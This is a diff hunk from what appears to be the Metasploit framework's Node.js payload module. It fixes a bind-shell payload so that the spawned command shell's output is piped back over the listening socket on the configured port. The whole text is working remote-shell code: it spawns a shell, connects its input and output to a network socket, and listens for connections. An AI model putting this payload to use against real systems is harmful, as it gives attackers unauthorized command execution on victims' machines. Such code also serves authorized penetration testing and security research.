@@ -19,11 +19,11 @@ module Msf::Payload::NodeJS
           var sh = cp.spawn(cmd, []);
           socket.pipe(sh.stdin);
           if (typeof util.pump === "undefined") {
-            sh.stdout.pipe(client.socket);
-            sh.stderr.pipe(client.socket);          
+            sh.stdout.pipe(socket);
+            sh.stderr.pipe(socket);
           } else {
-            util.pump(sh.stdout, client.socket);
-            util.pump(sh.stderr, client.socket);
+            util.pump(sh.stdout, socket);
+            util.pump(sh.stderr, socket);
           }
         });
         server.listen(#{datastore['LPORT']});
